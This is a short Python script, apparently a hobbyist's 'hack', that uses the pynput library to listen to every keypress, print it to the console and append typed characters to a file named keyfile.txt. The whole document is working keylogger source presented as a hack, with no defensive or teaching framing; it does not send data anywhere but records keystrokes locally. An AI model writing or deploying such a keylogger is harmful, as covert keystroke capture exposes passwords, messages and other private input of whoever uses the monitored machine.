from pynput import keyboard

def keypressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except :
            print("error")

if __name__ == "__main__":
    print("alexander hack works")
    print("all the key log will appear now")
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()